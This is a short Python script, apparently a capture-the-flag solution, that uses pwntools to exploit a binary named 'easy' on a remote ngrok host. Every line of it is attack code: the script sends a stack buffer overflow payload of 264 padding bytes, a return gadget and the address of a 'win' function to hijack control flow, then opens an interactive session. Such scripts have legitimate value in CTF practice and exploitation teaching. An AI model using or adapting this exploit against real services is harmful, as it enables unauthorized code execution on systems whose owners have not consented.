from pwn import *
exe = context.binary = ELF("./easy")
r = process()
r = remote("0.tcp.ap.ngrok.io",11637)
r.sendline(b"A" * 264 + p64(0x000000000040101a) + p64(exe.sym['win']))
r.interactive()
